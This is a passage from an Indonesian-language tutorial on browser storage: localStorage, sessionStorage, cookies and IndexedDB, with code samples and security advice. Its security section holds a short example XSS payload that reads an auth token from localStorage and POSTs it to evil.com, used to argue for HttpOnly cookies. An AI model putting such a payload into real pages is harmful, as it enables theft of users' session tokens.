+				<div class="d-xl-none">
+  <button class="btn btn-outline-primary btn-sm doks-toc-toggle collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#onThisPage" aria-controls="doks-docs-nav" aria-expanded="false" aria-label="Toggle On this page navigation">
+    <span>Daftar isi</span>
+    <span>
+      <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" class="doks doks-expand" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>Expand</title><polyline points="7 13 12 18 17 13"></polyline><polyline points="7 6 12 11 17 6"></polyline></svg>
+      <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" class="doks doks-collapse" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>Collapse</title><polyline points="17 11 12 6 7 11"></polyline><polyline points="17 18 12 13 7 18"></polyline></svg>
+    </span>
+  </button>
+  <div class="collapse" id="onThisPage">
+    <div class="card card-body mt-3 py-1">
+      <div class="page-links">
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#pendahuluan">Pendahuluan</a></li>
+    <li><a href="#perbandingan-mekanisme-penyimpanan">Perbandingan Mekanisme Penyimpanan</a></li>
+    <li><a href="#localstorage"><code>localStorage</code></a>
+      <ul>
+        <li><a href="#api-dasar">API Dasar</a></li>
+        <li><a href="#menyimpan-objectarray-json">Menyimpan Object/Array (JSON)</a></li>
+        <li><a href="#iterasi-semua-item">Iterasi Semua Item</a></li>
+        <li><a href="#event-storage--sinkronisasi-antar-tab">Event <code>storage</code> — Sinkronisasi Antar Tab</a></li>
+        <li><a href="#batasan-localstorage">Batasan <code>localStorage</code></a></li>
+      </ul>
+    </li>
+    <li><a href="#sessionstorage"><code>sessionStorage</code></a>
+      <ul>
+        <li><a href="#api-sama-dengan-localstorage">API (Sama dengan <code>localStorage</code>)</a></li>
+        <li><a href="#kapan-menggunakan-sessionstorage">Kapan Menggunakan <code>sessionStorage</code>?</a></li>
+        <li><a href="#perbedaan-localstorage-vs-sessionstorage">Perbedaan <code>localStorage</code> vs <code>sessionStorage</code></a></li>
+      </ul>
+    </li>
+    <li><a href="#cookie">Cookie</a>
+      <ul>
+        <li><a href="#kapan-menggunakan-cookie">Kapan Menggunakan Cookie?</a></li>
+        <li><a href="#membaca-cookie">Membaca Cookie</a></li>
+        <li><a href="#menulis-cookie">Menulis Cookie</a></li>
+        <li><a href="#menghapus-cookie">Menghapus Cookie</a></li>
+        <li><a href="#helper-function-untuk-cookie">Helper Function untuk Cookie</a></li>
+        <li><a href="#cookie-httponly-dan-secure">Cookie <code>HttpOnly</code> dan <code>Secure</code></a></li>
+        <li><a href="#samesite--perlindungan-csrf"><code>SameSite</code> — Perlindungan CSRF</a></li>
+      </ul>
+    </li>
+    <li><a href="#indexeddb--untuk-data-besar">IndexedDB — Untuk Data Besar</a>
+      <ul>
+        <li><a href="#kapan-menggunakan-indexeddb">Kapan Menggunakan IndexedDB?</a></li>
+        <li><a href="#contoh-dasar">Contoh Dasar</a></li>
+        <li><a href="#library-pembungkus">Library Pembungkus</a></li>
+      </ul>
+    </li>
+    <li><a href="#keamanan-apa-yang-boleh-disimpan">Keamanan: Apa yang Boleh Disimpan?</a>
+      <ul>
+        <li><a href="#-jangan-simpan-di-localstoragesessionstorage">❌ JANGAN Simpan di <code>localStorage</code>/<code>sessionStorage</code></a></li>
+        <li><a href="#-aman-disimpan-di-localstoragesessionstorage">✅ AMAN Disimpan di <code>localStorage</code>/<code>sessionStorage</code></a></li>
+        <li><a href="#mengapa-localstorage-tidak-aman-untuk-token">Mengapa <code>localStorage</code> Tidak Aman untuk Token?</a></li>
+      </ul>
+    </li>
+    <li><a href="#contoh-praktis">Contoh Praktis</a>
+      <ul>
+        <li><a href="#1-tema-darklight-dengan-localstorage">1. Tema Dark/Light dengan <code>localStorage</code></a></li>
+        <li><a href="#2-keranjang-belanja-dengan-localstorage">2. Keranjang Belanja dengan <code>localStorage</code></a></li>
+        <li><a href="#3-form-draft-dengan-sessionstorage">3. Form Draft dengan <code>sessionStorage</code></a></li>
+        <li><a href="#4-menyimpan-preferensi-user-dengan-cookie">4. Menyimpan Preferensi User dengan Cookie</a></li>
+      </ul>
+    </li>
+    <li><a href="#tips--best-practice">Tips &amp; Best Practice</a></li>
+    <li><a href="#ringkasan">Ringkasan</a></li>
+  </ul>
+</nav>
+      </div>
+    </div>
+  </div>
+</div>
+<div class="page-links d-none d-xl-block">
+  <h3>Daftar isi</h3>
+  <nav id="TableOfContents">
+  <ul>
+    <li><a href="#pendahuluan">Pendahuluan</a></li>
+    <li><a href="#perbandingan-mekanisme-penyimpanan">Perbandingan Mekanisme Penyimpanan</a></li>
+    <li><a href="#localstorage"><code>localStorage</code></a>
+      <ul>
+        <li><a href="#api-dasar">API Dasar</a></li>
+        <li><a href="#menyimpan-objectarray-json">Menyimpan Object/Array (JSON)</a></li>
+        <li><a href="#iterasi-semua-item">Iterasi Semua Item</a></li>
+        <li><a href="#event-storage--sinkronisasi-antar-tab">Event <code>storage</code> — Sinkronisasi Antar Tab</a></li>
+        <li><a href="#batasan-localstorage">Batasan <code>localStorage</code></a></li>
+      </ul>
+    </li>
+    <li><a href="#sessionstorage"><code>sessionStorage</code></a>
+      <ul>
+        <li><a href="#api-sama-dengan-localstorage">API (Sama dengan <code>localStorage</code>)</a></li>
+        <li><a href="#kapan-menggunakan-sessionstorage">Kapan Menggunakan <code>sessionStorage</code>?</a></li>
+        <li><a href="#perbedaan-localstorage-vs-sessionstorage">Perbedaan <code>localStorage</code> vs <code>sessionStorage</code></a></li>
+      </ul>
+    </li>
+    <li><a href="#cookie">Cookie</a>
+      <ul>
+        <li><a href="#kapan-menggunakan-cookie">Kapan Menggunakan Cookie?</a></li>
+        <li><a href="#membaca-cookie">Membaca Cookie</a></li>
+        <li><a href="#menulis-cookie">Menulis Cookie</a></li>
+        <li><a href="#menghapus-cookie">Menghapus Cookie</a></li>
+        <li><a href="#helper-function-untuk-cookie">Helper Function untuk Cookie</a></li>
+        <li><a href="#cookie-httponly-dan-secure">Cookie <code>HttpOnly</code> dan <code>Secure</code></a></li>
+        <li><a href="#samesite--perlindungan-csrf"><code>SameSite</code> — Perlindungan CSRF</a></li>
+      </ul>
+    </li>
+    <li><a href="#indexeddb--untuk-data-besar">IndexedDB — Untuk Data Besar</a>
+      <ul>
+        <li><a href="#kapan-menggunakan-indexeddb">Kapan Menggunakan IndexedDB?</a></li>
+        <li><a href="#contoh-dasar">Contoh Dasar</a></li>
+        <li><a href="#library-pembungkus">Library Pembungkus</a></li>
+      </ul>
+    </li>
+    <li><a href="#keamanan-apa-yang-boleh-disimpan">Keamanan: Apa yang Boleh Disimpan?</a>
+      <ul>
+        <li><a href="#-jangan-simpan-di-localstoragesessionstorage">❌ JANGAN Simpan di <code>localStorage</code>/<code>sessionStorage</code></a></li>
+        <li><a href="#-aman-disimpan-di-localstoragesessionstorage">✅ AMAN Disimpan di <code>localStorage</code>/<code>sessionStorage</code></a></li>
+        <li><a href="#mengapa-localstorage-tidak-aman-untuk-token">Mengapa <code>localStorage</code> Tidak Aman untuk Token?</a></li>
+      </ul>
+    </li>
+    <li><a href="#contoh-praktis">Contoh Praktis</a>
+      <ul>
+        <li><a href="#1-tema-darklight-dengan-localstorage">1. Tema Dark/Light dengan <code>localStorage</code></a></li>
+        <li><a href="#2-keranjang-belanja-dengan-localstorage">2. Keranjang Belanja dengan <code>localStorage</code></a></li>
+        <li><a href="#3-form-draft-dengan-sessionstorage">3. Form Draft dengan <code>sessionStorage</code></a></li>
+        <li><a href="#4-menyimpan-preferensi-user-dengan-cookie">4. Menyimpan Preferensi User dengan Cookie</a></li>
+      </ul>
+    </li>
+    <li><a href="#tips--best-practice">Tips &amp; Best Practice</a></li>
+    <li><a href="#ringkasan">Ringkasan</a></li>
+  </ul>
+</nav>
+  </div>
+
+			</nav>
+			<h2 id="pendahuluan">Pendahuluan <a href="#pendahuluan" class="anchor" aria-hidden="true">#</a></h2>
+<p>Aplikasi web modern sering perlu menyimpan data di <strong>sisi klien</strong> (browser) — misalnya preferensi tema, keranjang belanja, token login, atau draft form. Data ini harus tetap ada meskipun halaman di-refresh atau browser ditutup.</p>
+<p>JavaScript menyediakan beberapa mekanisme penyimpanan di browser:</p>
+<ul>
+<li><strong><code>localStorage</code></strong> — data permanen per origin.</li>
+<li><strong><code>sessionStorage</code></strong> — data per tab/sesi.</li>
+<li><strong>Cookie</strong> — data kecil yang dikirim ke server setiap request.</li>
+<li><strong>IndexedDB</strong> — database NoSQL di browser untuk data besar.</li>
+</ul>
+<p>Artikel ini membahas keempatnya, perbedaannya, kasus penggunaan, serta best practice keamanan.</p>
+<blockquote>
+<p><strong>Asumsi:</strong> Anda sudah memahami DOM dan event handling dari artikel sebelumnya. Gunakan DevTools → tab <strong>Application</strong> untuk melihat storage.</p>
+</blockquote>
+<hr>
+<h2 id="perbandingan-mekanisme-penyimpanan">Perbandingan Mekanisme Penyimpanan <a href="#perbandingan-mekanisme-penyimpanan" class="anchor" aria-hidden="true">#</a></h2>
+<table>
+<thead>
+<tr>
+<th>Aspek</th>
+<th><code>localStorage</code></th>
+<th><code>sessionStorage</code></th>
+<th>Cookie</th>
+<th>IndexedDB</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Kapasitas</td>
+<td>~5–10 MB</td>
+<td>~5 MB</td>
+<td>~4 KB per cookie</td>
+<td>~50 MB+</td>
+</tr>
+<tr>
+<td>Masa hidup</td>
+<td>Permanen (sampai dihapus)</td>
+<td>Per tab/sesi</td>
+<td>Bisa diatur (expires)</td>
+<td>Permanen</td>
+</tr>
+<tr>
+<td>Dikirim ke server</td>
+<td>❌</td>
+<td>❌</td>
+<td>✅ (setiap request)</td>
+<td>❌</td>
+</tr>
+<tr>
+<td>API</td>
+<td>Synchronous</td>
+<td>Synchronous</td>
+<td>Synchronous (document.cookie)</td>
+<td>Asynchronous</td>
+</tr>
+<tr>
+<td>Tipe data</td>
+<td>String saja</td>
+<td>String saja</td>
+<td>String saja</td>
+<td>Semua tipe (structured)</td>
+</tr>
+<tr>
+<td>Akses dari JS</td>
+<td>✅</td>
+<td>✅</td>
+<td>✅ (kecuali HttpOnly)</td>
+<td>✅</td>
+</tr>
+<tr>
+<td>Scope</td>
+<td>Per origin</td>
+<td>Per tab + origin</td>
+<td>Per domain + path</td>
+<td>Per origin</td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p><strong>Ringkasan cepat:</strong> Gunakan <code>localStorage</code> untuk preferensi &amp; data non-sensitif, <code>sessionStorage</code> untuk data sementara per tab, cookie untuk data yang perlu dikirim ke server (misalnya session ID), dan IndexedDB untuk data besar/terstruktur.</p>
+</blockquote>
+<hr>
+<h2 id="localstorage"><code>localStorage</code> <a href="#localstorage" class="anchor" aria-hidden="true">#</a></h2>
+<p>Menyimpan data <strong>permanen</strong> per origin — tetap ada meskipun browser ditutup, sampai dihapus manual atau oleh kode.</p>
+<h3 id="api-dasar">API Dasar <a href="#api-dasar" class="anchor" aria-hidden="true">#</a></h3>
+<pre><code class="language-javascript">// Menyimpan
+localStorage.setItem(&quot;tema&quot;, &quot;dark&quot;);
+localStorage.setItem(&quot;bahasa&quot;, &quot;id&quot;);
+
+// Mengambil
+const tema = localStorage.getItem(&quot;tema&quot;);
+console.log(tema); // &quot;dark&quot;
+
+// Mengambil yang tidak ada
+console.log(localStorage.getItem(&quot;tidakAda&quot;)); // null
+
+// Menghapus satu item
+localStorage.removeItem(&quot;tema&quot;);
+
+// Menghapus semua
+localStorage.clear();
+
+// Jumlah item
+console.log(localStorage.length);
+
+// Key berdasarkan index
+console.log(localStorage.key(0));
+</code></pre>
+<h3 id="menyimpan-objectarray-json">Menyimpan Object/Array (JSON) <a href="#menyimpan-objectarray-json" class="anchor" aria-hidden="true">#</a></h3>
+<p><code>localStorage</code> hanya bisa menyimpan <strong>string</strong>. Untuk object/array, gunakan <code>JSON.stringify()</code> dan <code>JSON.parse()</code>.</p>
+<pre><code class="language-javascript">const user = {
+  id: 1,
+  nama: &quot;Budi&quot;,
+  preferensi: { tema: &quot;dark&quot;, bahasa: &quot;id&quot; }
+};
+
+// Simpan
+localStorage.setItem(&quot;user&quot;, JSON.stringify(user));
+
+// Ambil
+const stored = localStorage.getItem(&quot;user&quot;);
+if (stored) {
+  const userData = JSON.parse(stored);
+  console.log(userData.nama); // &quot;Budi&quot;
+}
+</code></pre>
+<p><strong>Helper function untuk kenyamanan:</strong></p>
+<pre><code class="language-javascript">const storage = {
+  set(key, value) {
+    try {
+      localStorage.setItem(key, JSON.stringify(value));
+    } catch (e) {
+      console.error(&quot;Gagal menyimpan:&quot;, e);
+    }
+  },
+
+  get(key, defaultValue = null) {
+    try {
+      const item = localStorage.getItem(key);
+      return item ? JSON.parse(item) : defaultValue;
+    } catch (e) {
+      console.error(&quot;Gagal membaca:&quot;, e);
+      return defaultValue;
+    }
+  },
+
+  remove(key) {
+    localStorage.removeItem(key);
+  },
+
+  clear() {
+    localStorage.clear();
+  }
+};
+
+// Penggunaan
+storage.set(&quot;user&quot;, { nama: &quot;Budi&quot; });
+const user = storage.get(&quot;user&quot;, {});
+console.log(user.nama); // &quot;Budi&quot;
+</code></pre>
+<h3 id="iterasi-semua-item">Iterasi Semua Item <a href="#iterasi-semua-item" class="anchor" aria-hidden="true">#</a></h3>
+<pre><code class="language-javascript">// Cara 1: for loop
+for (let i = 0; i &lt; localStorage.length; i++) {
+  const key = localStorage.key(i);
+  console.log(`${key}: ${localStorage.getItem(key)}`);
+}
+
+// Cara 2: Object.keys (localStorage adalah object-like)
+Object.keys(localStorage).forEach(key =&gt; {
+  console.log(`${key}: ${localStorage.getItem(key)}`);
+});
+</code></pre>
+<h3 id="event-storage--sinkronisasi-antar-tab">Event <code>storage</code> — Sinkronisasi Antar Tab <a href="#event-storage--sinkronisasi-antar-tab" class="anchor" aria-hidden="true">#</a></h3>
+<p>Event <code>storage</code> dipicu di <strong>tab lain</strong> (bukan tab yang mengubah) saat <code>localStorage</code> berubah. Berguna untuk sinkronisasi state antar tab.</p>
+<pre><code class="language-javascript">window.addEventListener(&quot;storage&quot;, (e) =&gt; {
+  console.log(&quot;Key:&quot;, e.key);
+  console.log(&quot;Nilai lama:&quot;, e.oldValue);
+  console.log(&quot;Nilai baru:&quot;, e.newValue);
+  console.log(&quot;URL:&quot;, e.url);
+
+  if (e.key === &quot;tema&quot;) {
+    terapkanTema(e.newValue);
+  }
+});
+</code></pre>
+<blockquote>
+<p><strong>Catatan:</strong> Event <code>storage</code> <strong>tidak</strong> dipicu di tab yang melakukan perubahan — hanya di tab lain dari origin yang sama.</p>
+</blockquote>
+<h3 id="batasan-localstorage">Batasan <code>localStorage</code> <a href="#batasan-localstorage" class="anchor" aria-hidden="true">#</a></h3>
+<ul>
+<li><strong>Hanya string</strong> — object harus di-JSON-kan.</li>
+<li><strong>Synchronous</strong> — operasi besar bisa memblokir main thread.</li>
+<li><strong>Kapasitas terbatas</strong> (~5–10 MB).</li>
+<li><strong>Tidak aman untuk data sensitif</strong> — bisa diakses JavaScript (rentan XSS).</li>
+<li><strong>Tidak bisa diakses di private mode</strong> (Safari lama) — bisa throw error.</li>
+</ul>
+<p><strong>Error handling:</strong></p>
+<pre><code class="language-javascript">try {
+  localStorage.setItem(&quot;data&quot;, &quot;x&quot;.repeat(10 * 1024 * 1024)); // 10 MB
+} catch (e) {
+  if (e.name === &quot;QuotaExceededError&quot;) {
+    console.error(&quot;Storage penuh!&quot;);
+  }
+}
+</code></pre>
+<hr>
+<h2 id="sessionstorage"><code>sessionStorage</code> <a href="#sessionstorage" class="anchor" aria-hidden="true">#</a></h2>
+<p>Mirip <code>localStorage</code>, tetapi data hanya bertahan <strong>selama sesi tab</strong>. Data hilang saat tab ditutup.</p>
+<h3 id="api-sama-dengan-localstorage">API (Sama dengan <code>localStorage</code>) <a href="#api-sama-dengan-localstorage" class="anchor" aria-hidden="true">#</a></h3>
+<pre><code class="language-javascript">sessionStorage.setItem(&quot;draft&quot;, &quot;Teks draft...&quot;);
+const draft = sessionStorage.getItem(&quot;draft&quot;);
+sessionStorage.removeItem(&quot;draft&quot;);
+sessionStorage.clear();
+</code></pre>
+<h3 id="kapan-menggunakan-sessionstorage">Kapan Menggunakan <code>sessionStorage</code>? <a href="#kapan-menggunakan-sessionstorage" class="anchor" aria-hidden="true">#</a></h3>
+<ul>
+<li><strong>Draft form</strong> — agar tidak hilang saat refresh, tetapi hilang saat tab ditutup.</li>
+<li><strong>State sementara</strong> — misalnya langkah wizard multi-step.</li>
+<li><strong>Data per tab</strong> — misalnya filter yang berbeda di setiap tab.</li>
+</ul>
+<pre><code class="language-javascript">// Simpan draft form
+const form = document.querySelector(&quot;#form&quot;);
+form.addEventListener(&quot;input&quot;, () =&gt; {
+  const data = Object.fromEntries(new FormData(form));
+  sessionStorage.setItem(&quot;draft-form&quot;, JSON.stringify(data));
+});
+
+// Restore saat halaman dimuat
+window.addEventListener(&quot;DOMContentLoaded&quot;, () =&gt; {
+  const draft = sessionStorage.getItem(&quot;draft-form&quot;);
+  if (draft) {
+    const data = JSON.parse(draft);
+    Object.entries(data).forEach(([key, value]) =&gt; {
+      const input = form.elements[key];
+      if (input) input.value = value;
+    });
+  }
+});
+
+// Hapus draft setelah submit berhasil
+form.addEventListener(&quot;submit&quot;, (e) =&gt; {
+  e.preventDefault();
+  // ... kirim data ...
+  sessionStorage.removeItem(&quot;draft-form&quot;);
+});
+</code></pre>
+<h3 id="perbedaan-localstorage-vs-sessionstorage">Perbedaan <code>localStorage</code> vs <code>sessionStorage</code> <a href="#perbedaan-localstorage-vs-sessionstorage" class="anchor" aria-hidden="true">#</a></h3>
+<pre><code class="language-javascript">// Di tab 1
+localStorage.setItem(&quot;a&quot;, &quot;1&quot;);     // terlihat di semua tab
+sessionStorage.setItem(&quot;b&quot;, &quot;2&quot;);   // hanya di tab ini
+
+// Buka tab 2 (origin sama)
+console.log(localStorage.getItem(&quot;a&quot;));   // &quot;1&quot; — bisa diakses
+console.log(sessionStorage.getItem(&quot;b&quot;)); // null — tidak bisa diakses
+</code></pre>
+<blockquote>
+<p><strong>Catatan:</strong> <code>sessionStorage</code> juga terpisah per tab, tetapi <strong>dibagi</strong> jika tab dibuka via <code>window.open()</code> dari tab yang sama (di beberapa browser).</p>
+</blockquote>
+<hr>
+<h2 id="cookie">Cookie <a href="#cookie" class="anchor" aria-hidden="true">#</a></h2>
+<p><strong>Cookie</strong> adalah data kecil yang disimpan di browser dan <strong>dikirim ke server</strong> pada setiap request HTTP ke domain yang sama.</p>
+<h3 id="kapan-menggunakan-cookie">Kapan Menggunakan Cookie? <a href="#kapan-menggunakan-cookie" class="anchor" aria-hidden="true">#</a></h3>
+<ul>
+<li><strong>Session ID</strong> — untuk autentikasi (biasanya <code>HttpOnly</code>).</li>
+<li><strong>Preferensi</strong> yang perlu diketahui server (misalnya bahasa).</li>
+<li><strong>Tracking</strong> (analytics, iklan) — biasanya pihak ketiga.</li>
+</ul>
+<blockquote>
+<p>⚠️ <strong>Peringatan:</strong> Untuk data yang <strong>tidak</strong> perlu dikirim ke server, gunakan <code>localStorage</code>/<code>sessionStorage</code> — lebih efisien dan tidak membebani request.</p>
+</blockquote>
+<h3 id="membaca-cookie">Membaca Cookie <a href="#membaca-cookie" class="anchor" aria-hidden="true">#</a></h3>
+<p>Semua cookie diakses melalui satu string <code>document.cookie</code>:</p>
+<pre><code class="language-javascript">console.log(document.cookie);
+// &quot;tema=dark; bahasa=id; session_id=abc123&quot;
+</code></pre>
+<h3 id="menulis-cookie">Menulis Cookie <a href="#menulis-cookie" class="anchor" aria-hidden="true">#</a></h3>
+<pre><code class="language-javascript">document.cookie = &quot;tema=dark&quot;;
+</code></pre>
+<p><strong>Menambah cookie lain</strong> (tidak menimpa, kecuali nama sama):</p>
+<pre><code class="language-javascript">document.cookie = &quot;bahasa=id&quot;;
+// document.cookie sekarang: &quot;tema=dark; bahasa=id&quot;
+</code></pre>
+<p><strong>Dengan atribut:</strong></p>
+<pre><code class="language-javascript">document.cookie = &quot;tema=dark; path=/; max-age=86400; SameSite=Lax&quot;;
+</code></pre>
+<table>
+<thead>
+<tr>
+<th>Atribut</th>
+<th>Arti</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>path=/</code></td>
+<td>Cookie tersedia di seluruh situs</td>
+</tr>
+<tr>
+<td><code>path=/admin</code></td>
+<td>Cookie hanya di path <code>/admin</code></td>
+</tr>
+<tr>
+<td><code>max-age=86400</code></td>
+<td>Masa hidup dalam detik (1 hari)</td>
+</tr>
+<tr>
+<td><code>expires=...</code></td>
+<td>Tanggal kedaluwarsa (format UTC)</td>
+</tr>
+<tr>
+<td><code>domain=.example.com</code></td>
+<td>Cookie tersedia di subdomain</td>
+</tr>
+<tr>
+<td><code>Secure</code></td>
+<td>Hanya dikirim via HTTPS</td>
+</tr>
+<tr>
+<td><code>HttpOnly</code></td>
+<td>Tidak bisa diakses JavaScript (hanya server)</td>
+</tr>
+<tr>
+<td><code>SameSite=Strict/Lax/None</code></td>
+<td>Kontrol pengiriman lintas situs</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Contoh dengan <code>expires</code>:</strong></p>
+<pre><code class="language-javascript">const date = new Date();
+date.setTime(date.getTime() + 7 * 24 * 60 * 60 * 1000); // 7 hari
+document.cookie = `tema=dark; expires=${date.toUTCString()}; path=/`;
+</code></pre>
+<h3 id="menghapus-cookie">Menghapus Cookie <a href="#menghapus-cookie" class="anchor" aria-hidden="true">#</a></h3>
+<p>Set <code>max-age=0</code> atau <code>expires</code> di masa lalu:</p>
+<pre><code class="language-javascript">document.cookie = &quot;tema=; max-age=0; path=/&quot;;
+</code></pre>
+<blockquote>
+<p><strong>Catatan:</strong> Atribut <code>path</code> dan <code>domain</code> harus <strong>sama</strong> dengan saat cookie dibuat agar penghapusan berhasil.</p>
+</blockquote>
+<h3 id="helper-function-untuk-cookie">Helper Function untuk Cookie <a href="#helper-function-untuk-cookie" class="anchor" aria-hidden="true">#</a></h3>
+<pre><code class="language-javascript">const cookieHelper = {
+  set(name, value, days = 7) {
+    const date = new Date();
+    date.setTime(date.getTime() + days * 24 * 60 * 60 * 1000);
+    document.cookie = `${name}=${encodeURIComponent(value)}; expires=${date.toUTCString()}; path=/; SameSite=Lax`;
+  },
+
+  get(name) {
+    const cookies = document.cookie.split(&quot;; &quot;);
+    for (const cookie of cookies) {
+      const [key, ...rest] = cookie.split(&quot;=&quot;);
+      if (key === name) {
+        return decodeURIComponent(rest.join(&quot;=&quot;));
+      }
+    }
+    return null;
+  },
+
+  remove(name) {
+    document.cookie = `${name}=; max-age=0; path=/`;
+  }
+};
+
+// Penggunaan
+cookieHelper.set(&quot;tema&quot;, &quot;dark&quot;);
+console.log(cookieHelper.get(&quot;tema&quot;)); // &quot;dark&quot;
+cookieHelper.remove(&quot;tema&quot;);
+</code></pre>
+<h3 id="cookie-httponly-dan-secure">Cookie <code>HttpOnly</code> dan <code>Secure</code> <a href="#cookie-httponly-dan-secure" class="anchor" aria-hidden="true">#</a></h3>
+<ul>
+<li><strong><code>HttpOnly</code></strong> — cookie <strong>tidak bisa</strong> diakses via <code>document.cookie</code>. Hanya bisa di-set oleh server. Ini mencegah pencurian cookie via XSS.</li>
+<li><strong><code>Secure</code></strong> — cookie hanya dikirim via HTTPS.</li>
+</ul>
+<pre><code class="language-javascript">// Cookie HttpOnly TIDAK bisa di-set dari JavaScript!
+// Harus di-set oleh server via header Set-Cookie:
+// Set-Cookie: session_id=abc123; HttpOnly; Secure; SameSite=Strict; Path=/
+</code></pre>
+<blockquote>
+<p><strong>Penting untuk keamanan:</strong> Cookie session/token autentikasi <strong>harus</strong> <code>HttpOnly</code> + <code>Secure</code> + <code>SameSite</code>. Jangan pernah menyimpan token autentikasi di <code>localStorage</code> (rentan XSS).</p>
+</blockquote>
+<h3 id="samesite--perlindungan-csrf"><code>SameSite</code> — Perlindungan CSRF <a href="#samesite--perlindungan-csrf" class="anchor" aria-hidden="true">#</a></h3>
+<table>
+<thead>
+<tr>
+<th>Nilai</th>
+<th>Perilaku</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>Strict</code></td>
+<td>Cookie <strong>tidak</strong> dikirim pada request lintas situs</td>
+</tr>
+<tr>
+<td><code>Lax</code> (default)</td>
+<td>Cookie dikirim pada navigasi top-level (klik link), tidak pada request POST lintas situs</td>
+</tr>
+<tr>
+<td><code>None</code></td>
+<td>Cookie selalu dikirim (wajib <code>Secure</code>)</td>
+</tr>
+</tbody>
+</table>
+<pre><code class="language-javascript">document.cookie = &quot;pref=dark; SameSite=Strict; Secure; path=/&quot;;
+</code></pre>
+<hr>
+<h2 id="indexeddb--untuk-data-besar">IndexedDB — Untuk Data Besar <a href="#indexeddb--untuk-data-besar" class="anchor" aria-hidden="true">#</a></h2>
+<p><strong>IndexedDB</strong> adalah database NoSQL di browser untuk menyimpan data terstruktur dalam jumlah besar. API-nya asynchronous dan lebih kompleks.</p>
+<h3 id="kapan-menggunakan-indexeddb">Kapan Menggunakan IndexedDB? <a href="#kapan-menggunakan-indexeddb" class="anchor" aria-hidden="true">#</a></h3>
+<ul>
+<li>Data &gt; 5 MB.</li>
+<li>Menyimpan file/blob (gambar, audio).</li>
+<li>Cache data API untuk offline (PWA).</li>
+<li>Data terstruktur dengan index.</li>
+</ul>
+<h3 id="contoh-dasar">Contoh Dasar <a href="#contoh-dasar" class="anchor" aria-hidden="true">#</a></h3>
+<pre><code class="language-javascript">// Buka database
+const request = indexedDB.open(&quot;TokoDB&quot;, 1);
+
+request.onupgradeneeded = (e) =&gt; {
+  const db = e.target.result;
+  if (!db.objectStoreNames.contains(&quot;produk&quot;)) {
+    const store = db.createObjectStore(&quot;produk&quot;, { keyPath: &quot;id&quot;, autoIncrement: true });
+    store.createIndex(&quot;nama&quot;, &quot;nama&quot;, { unique: false });
+  }
+};
+
+request.onsuccess = (e) =&gt; {
+  const db = e.target.result;
+  console.log(&quot;Database terbuka&quot;);
+
+  // Tambah data
+  const tx = db.transaction(&quot;produk&quot;, &quot;readwrite&quot;);
+  const store = tx.objectStore(&quot;produk&quot;);
+  store.add({ nama: &quot;Keyboard&quot;, harga: 450000 });
+
+  tx.oncomplete = () =&gt; {
+    console.log(&quot;Data tersimpan&quot;);
+
+    // Baca data
+    const tx2 = db.transaction(&quot;produk&quot;, &quot;readonly&quot;);
+    const store2 = tx2.objectStore(&quot;produk&quot;);
+    const getAll = store2.getAll();
+
+    getAll.onsuccess = () =&gt; {
+      console.log(getAll.result);
+    };
+  };
+};
+
+request.onerror = (e) =&gt; {
+  console.error(&quot;Gagal membuka database:&quot;, e.target.error);
+};
+</code></pre>
+<h3 id="library-pembungkus">Library Pembungkus <a href="#library-pembungkus" class="anchor" aria-hidden="true">#</a></h3>
+<p>API IndexedDB mentah sangat verbose. Untuk penggunaan praktis, gunakan library:</p>
+<ul>
+<li><strong><code>idb</code></strong> — pembungkus kecil dan modern.</li>
+<li><strong><code>localForage</code></strong> — API mirip <code>localStorage</code>, mendukung IndexedDB di belakang layar.</li>
+</ul>
+<pre><code class="language-javascript">// Contoh dengan localForage
+import localforage from &quot;localforage&quot;;
+
+await localforage.setItem(&quot;user&quot;, { nama: &quot;Budi&quot; });
+const user = await localforage.getItem(&quot;user&quot;);
+console.log(user.nama); // &quot;Budi&quot;
+</code></pre>
+<blockquote>
+<p><strong>Catatan:</strong> Detail IndexedDB dibahas di artikel terpisah. Untuk sebagian besar kasus, <code>localStorage</code> atau library seperti <code>localForage</code> sudah cukup.</p>
+</blockquote>
+<hr>
+<h2 id="keamanan-apa-yang-boleh-disimpan">Keamanan: Apa yang Boleh Disimpan? <a href="#keamanan-apa-yang-boleh-disimpan" class="anchor" aria-hidden="true">#</a></h2>
+<h3 id="-jangan-simpan-di-localstoragesessionstorage">❌ JANGAN Simpan di <code>localStorage</code>/<code>sessionStorage</code> <a href="#-jangan-simpan-di-localstoragesessionstorage" class="anchor" aria-hidden="true">#</a></h3>
+<ul>
+<li><strong>Token autentikasi</strong> (JWT, session token) — rentan XSS.</li>
+<li><strong>Password</strong> — dalam bentuk apa pun.</li>
+<li><strong>Data pribadi sensitif</strong> (KTP, kartu kredit, nomor telepon).</li>
+<li><strong>API key rahasia</strong> — bisa diakses siapa saja yang membuka DevTools.</li>
+</ul>
+<h3 id="-aman-disimpan-di-localstoragesessionstorage">✅ AMAN Disimpan di <code>localStorage</code>/<code>sessionStorage</code> <a href="#-aman-disimpan-di-localstoragesessionstorage" class="anchor" aria-hidden="true">#</a></h3>
+<ul>
+<li>Preferensi tampilan (tema, bahasa, font size).</li>
+<li>Keranjang belanja (non-sensitif).</li>
+<li>Draft form (non-sensitif).</li>
+<li>State UI (tab aktif, filter).</li>
+<li>Data cache non-sensitif.</li>
+</ul>
+<h3 id="mengapa-localstorage-tidak-aman-untuk-token">Mengapa <code>localStorage</code> Tidak Aman untuk Token? <a href="#mengapa-localstorage-tidak-aman-untuk-token" class="anchor" aria-hidden="true">#</a></h3>
+<p>JavaScript di halaman <strong>bisa mengakses</strong> <code>localStorage</code>. Jika ada <strong>XSS</strong> (Cross-Site Scripting) — misalnya library yang rentan atau input user yang tidak disanitasi — penyerang bisa mencuri token:</p>
+<pre><code class="language-javascript">// Penyerang menyisipkan script ini via XSS:
+const stolen = localStorage.getItem(&quot;token&quot;);
+fetch(&quot;https://evil.com/steal&quot;, { method: &quot;POST&quot;, body: stolen });
+</code></pre>
+<p><strong>Solusi untuk autentikasi:</strong></p>
+<ul>
